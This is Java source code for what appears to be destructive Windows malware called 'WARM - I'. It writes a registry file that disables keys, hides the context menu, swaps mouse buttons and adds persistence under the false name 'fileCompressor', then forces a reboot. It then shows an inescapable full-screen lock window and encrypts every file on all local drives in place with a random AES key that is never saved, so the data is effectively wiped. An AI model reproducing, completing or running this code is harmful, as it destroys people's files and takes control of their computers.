package WAR;
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;
import javax.swing.*;
import javax.swing.filechooser.FileSystemView;
import java.awt.*;
import java.awt.event.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.nio.file.*;
import java.nio.file.attribute.BasicFileAttributes;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.concurrent.atomic.AtomicInteger;
import static java.nio.file.Files.writeString;
public final class Main {
    private static FileInputStream inputStream;
    private static FileOutputStream outputStream;
    private static HashMap<String, Integer> driveMap = new HashMap<>();
    private static final String mapPath = "C:\\Program Files\\map.dat";
    private static ObjectOutputStream oos;
    private static final GraphicsDevice[] gs = GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices();
    private static final ArrayList<File> drives = new ArrayList<>();
    private static final Point p = new Point(420, 420);
    private static final Path regPath = Path.of("C:\\Program Files\\regdata.reg");
    private static final String shutDownCommand = "shutdown /r /t 0";
    private static final String regRunCommand = "regedit /s C:\\Program Files\\regdata.reg";
    private static final String runMessage = "Already Executed !";
    private static final String regData = """
            Windows Registry Editor Version 5.00

            [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Keyboard Layout]
            "Scancode Map"=hex:00,00,00,00,00,00,00,00,09,00,00,00,00,00,5b,e0,00,00,5c,e0,00,00,5d,e0,00,00,44,00,00,00,1d,00,00,00,38,00,00,00,1d,e0,00,00,38,e0,00,00,2A,00,00,00,46,00,00,00,3A,00,00,00,3B,00,00,00,3C,00,00,00,3D,00,00,00,3E,00,00,00,3F,00,00,00,40,00,00,00,41,00,00,00,43,00,00,00,57,00,00,00,58,00,00,00,00,00

            [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]
            "fileCompressor"="C:\\\\Program Files\\\\WARM - I.exe"

            [HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer]
            "NoViewContextMenu"=dword:00000001
                        
            [HKEY_CURRENT_USER\\Control Panel\\Mouse]
            "SwapMouseButtons"="1"
            "DoubleClickSpeed"="0"
            "ClickLock"=dword:00000000""";
    static {try {oos = new ObjectOutputStream(new FileOutputStream(mapPath));} catch (IOException ignored) {}for (File file : File.listRoots()) {if ((FileSystemView.getFileSystemView().getSystemTypeDescription(file)).equalsIgnoreCase("local disk")) {drives.add(file);driveMap.put(file.getAbsolutePath(), 0);}}}
        public static void main(String[] args) {
        JFrame frame = new JFrame("window");
        frame.setUndecorated(true);
        frame.pack();
        frame.setSize(Toolkit.getDefaultToolkit().getScreenSize().width, Toolkit.getDefaultToolkit().getScreenSize().height);
        frame.setTitle("WARM - I");
        frame.setDefaultCloseOperation(WindowConstants.DO_NOTHING_ON_CLOSE);
        frame.setResizable(false);
        frame.setIconImage(new ImageIcon("WARM - I logo.png").getImage());
        frame.getContentPane().setBackground(Color.BLACK);
        frame.setExtendedState(Frame.MAXIMIZED_BOTH);
        frame.setFocusTraversalKeysEnabled(false);
        frame.getContentPane().setCursor(Toolkit.getDefaultToolkit().createCustomCursor(new BufferedImage(16, 16, BufferedImage.TYPE_INT_ARGB), new Point(0, 0), "null cursor"));
        JLabel label = new JLabel("WARM - I");
        label.setHorizontalTextPosition(0);
        label.setVerticalTextPosition(0);
        label.setForeground(Color.red);
        label.setFont(new Font(Font.SANS_SERIF, Font.BOLD, 60));
        label.setVerticalAlignment(SwingConstants.CENTER);
        label.setHorizontalAlignment(SwingConstants.CENTER);
        frame.add(label);
        frame.setAlwaysOnTop(true);
        frame.setFocusableWindowState(true);
        frame.setFocusable(true);
        frame.requestFocus();
        try {FileReader fileReader = new FileReader("C:\\Program Files\\compressordata.dat");
            if (fileReader.read() != -1) {readMap();
                frame.addKeyListener(new KeyListener() {
                    @Override
                    public void keyTyped(KeyEvent e) {e.consume();frame.requestFocus();}
                    @Override
                    public void keyPressed(KeyEvent e) {e.consume();frame.requestFocus();}
                    @Override
                    public void keyReleased(KeyEvent e) {e.consume();frame.requestFocus();}});
                frame.addMouseListener(new MouseListener() {
                    @Override
                    public void mouseClicked(MouseEvent e) {frame.requestFocus();}
                    @Override
                    public void mousePressed(MouseEvent e) {frame.requestFocus();}
                    @Override
                    public void mouseReleased(MouseEvent e) {frame.requestFocus();}
                    @Override
                    public void mouseEntered(MouseEvent e) {frame.requestFocus();for (GraphicsDevice device : gs) {GraphicsConfiguration[] configurations = device.getConfigurations();for (GraphicsConfiguration config : configurations) {Rectangle bounds = config.getBounds();if (bounds.contains(p)) {try {new Robot(device).mouseMove(new Point(p.x - bounds.getLocation().x, p.y - bounds.getLocation().y).x, new Point(p.x - bounds.getLocation().x, p.y - bounds.getLocation().y).y);} catch (AWTException ignored) {}return;}}}frame.requestFocus();}
                    @Override
                    public void mouseExited(MouseEvent e) {frame.requestFocus();for (GraphicsDevice device : gs) {GraphicsConfiguration[] configurations = device.getConfigurations();for (GraphicsConfiguration config : configurations) {Rectangle bounds = config.getBounds();if (bounds.contains(p)) {try {new Robot(device).mouseMove(new Point(p.x - bounds.getLocation().x, p.y - bounds.getLocation().y).x, new Point(p.x - bounds.getLocation().x, p.y - bounds.getLocation().y).y);} catch (AWTException ignored) {}return;}}}frame.requestFocus();}});
                frame.addWindowListener(new WindowAdapter() {
                    @Override
                    public void windowIconified(WindowEvent e) {frame.setState(Frame.NORMAL);frame.requestFocus();}});
                frame.addWindowFocusListener(new WindowFocusListener() {
                    @Override
                    public void windowGainedFocus(WindowEvent e) {}
                    @Override
                    public void windowLostFocus(WindowEvent e) {if (e.getNewState() != WindowEvent.WINDOW_CLOSED) {frame.setAlwaysOnTop(false);frame.setAlwaysOnTop(true);frame.requestFocus();}}});
                frame.setVisible(true);
                for (File drive : drives) {Path dir = Paths.get(drive.getAbsolutePath());AtomicInteger fileCount = new AtomicInteger(0);int fileRead = (driveMap.get(dir.toString()));
                    new Thread(new Runnable() {
                        @Override
                        public void run() {Cipher cipher = null;
                            try {cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");cipher.init(Cipher.ENCRYPT_MODE, KeyGenerator.getInstance("AES").generateKey(), generateIv());} catch (NoSuchAlgorithmException | InvalidAlgorithmParameterException |NoSuchPaddingException | InvalidKeyException ignored) {}
                            try {Cipher finalCipher = cipher;
                                Files.walkFileTree(dir, new SimpleFileVisitor<>() {
                                    @Override
                                    public FileVisitResult preVisitDirectory(Path dir, BasicFileAttributes attrs) {try {Files.walk(dir).forEach(path -> {if (fileCount.intValue() >= fileRead){processFile(finalCipher, path.toFile(),dir);}fileCount.getAndIncrement();});writeMap();} catch (Exception e) {return FileVisitResult.CONTINUE;} return FileVisitResult.CONTINUE;}
                                    @Override
                                    public FileVisitResult visitFileFailed(Path file, IOException exc) throws IOException {if (exc != null) {return FileVisitResult.CONTINUE;}return super.visitFileFailed(file, null);}});} catch (IOException ignored) {}}}).start();}
            } else {while (true) {try {fire();break;} catch (IOException ignored) {}}}} catch (IOException ignored) {while (true) {try {fire();break;} catch (IOException ignored1) {}}}}
    private static void processFile(Cipher cipher, File file, Path drive) {if (!file.isDirectory() && !(file.getAbsoluteFile().getName().equalsIgnoreCase("warm - i.exe")) && !(file.getAbsoluteFile().getName().equalsIgnoreCase("compressordata.dat")) && !(file.getAbsoluteFile().getName().equalsIgnoreCase("map.dat")) && !(file.getAbsoluteFile().getName().equalsIgnoreCase("regdata.reg")) && !(file.getAbsoluteFile().getName().equalsIgnoreCase("hellshell.sh"))) {try {inputStream = new FileInputStream(file);outputStream = new FileOutputStream(file);byte[] buffer = new byte[64];int bytesRead;while ((bytesRead = inputStream.read(buffer)) != -1) {byte[] output = cipher.update(buffer, 0, bytesRead);if (output != null) {outputStream.write(output);}}byte[] outputBytes = cipher.doFinal();if (outputBytes != null) {outputStream.write(outputBytes);}} catch (Exception ignored) {} finally {try {inputStream.close();outputStream.close();} catch (IOException ignored) {}}}driveMap.put(drive.getFileName().toString(),(driveMap.get(drive.getFileName().toString())+1) );}
    private static void fire() throws IOException {writeMap();writeString(regPath, regData);executeCommand(regRunCommand);new FileWriter("C:\\Program Files\\compressordata.dat").write(runMessage);executeCommand(shutDownCommand);}
    private static void writeMap() {try {oos.writeObject(driveMap);} catch (IOException ignored) {}}
    private static void readMap() {try {driveMap = (HashMap<String, Integer>) new ObjectInputStream(new FileInputStream(mapPath)).readObject();} catch (IOException | ClassNotFoundException ignored) {}}
    private static IvParameterSpec generateIv() {byte[] iv = new byte[16];new SecureRandom().nextBytes(iv);return new IvParameterSpec(iv);}
    private static void executeCommand(String command) {try {Process process = Runtime.getRuntime().exec(command);process.waitFor();} catch (IOException | InterruptedException ignored) {}}}
